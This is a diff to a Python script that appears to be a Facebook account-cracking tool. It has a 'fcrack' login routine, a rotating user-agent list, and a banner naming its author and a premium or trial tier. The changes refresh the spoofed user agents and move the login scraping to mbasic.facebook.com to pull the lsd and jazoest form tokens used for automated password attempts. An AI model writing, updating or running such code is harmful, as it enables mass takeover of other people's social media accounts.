@@ -157,16 +157,16 @@ def uaku():
 
 
 syed =[
-'Mozilla/5.0 (Linux; Android 9; CPH1893 Build/PKQ1.190414.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]',
-'Mozilla/5.0 (Linux; Android 11; SM-T505 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 10; SM-A022M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36.'
-'Mozilla/5.0 (Linux; Android 8.0.0; SM-G570M Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/280.0.0.9.119;]'
-'Mozilla/5.0 (Linux; Android 8.1.0; LAVA LE9820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
-'Mozilla/5.0 (Linux; 12; NTH-NX9) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36'
-'Mozilla/5.0 (Linux; Android 10; M10 4G PRO X Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
-'Mozilla/5.0 (Linux; Android 9; moto e6 play Build/POAS29.550-132-22) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 GNews Android/2022027771'
-'Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
-'Mozilla/5.0 (Linux; Android 9; SM-J415G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/314.1.0.45.119;]',]
+'Mozilla/5.0 (Linux; Android 11; M2011K2G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4664.104 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]',
+'Mozilla/5.0 (Linux; Android 9; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/336.0.0.13.142;]'
+'Mozilla/5.0 (Linux; Android 10; MAR-LX1A; HMSCore 6.0.1.305; GMSCore 21.45.16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 HuaweiBrowser/11.1.3.310 Mobile Safari/537.36'
+'Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S) Build/OPP28.65-37-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36'
+'Mozilla/5.0 (Linux; Android 10; moto g(8) play Build/QMDS30.47-33-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 newsbreak/19.8.0'
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.53/a6pjXpim-11'
+'Mozilla/5.0 (Linux; Android 7.0; F3111 Build/33.3.A.1.115; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]'
+'Mozilla/5.0 (Linux; Android 10; YAL-L41; HMSCore 6.2.0.302; GMSCore 21.48.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.0.303 Mobile Safari/537.36'
+'Mozilla/5.0 (Linux; Android 10; PPA-LX1 Build/HUAWEIPPA-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/309.0.0.47.119;]',]
 logo=("""\033[1;32m
  _______   ________  __    __  __     __ 
 /       \ /        |/  \  /  |/  |   /  |
@@ -180,8 +180,8 @@ $$$$$$$/  $$$$$$$$/ $$/   $$/     $/
 \033[1;32m--------------------------------------------------
 \033[1;97m    ✎ σwnєr:  DENV WU
 \033[1;97m    ✎ fαcєвσσk:  https://facebook.com/dnvunreachableee
-\033[1;97m    ✎ vєrsíσn:  [ 1.0 ]
-\033[1;97m    ✎ tчpє:  PREMIUM
+\033[1;97m    ✎ vєrsíσn:  [ 1.2 ]
+\033[1;97m    ✎ tчpє: TRIAL
 \033[1;32m--------------------------------------------------""")
 def linex():
 	print('\033[1;37m--------------------------------------------------')
@@ -216,7 +216,7 @@ def fia():
 				print(logo)
 				
 				linex()
-				print('[1] Method 1 \n')
+				print('[1] Method UPDATED \n')
 				linex()
 				mthd=input(' Choose: ')
 				linex()
@@ -518,7 +518,7 @@ def fcrack(uid,pwx,tl):
 			sys.stdout.write(f'\r [\033[1;97mdenv / \033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
-			free_fb = session.get('https://free.facebook.com').text
+			free_fb = session.get('https://mbasic.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
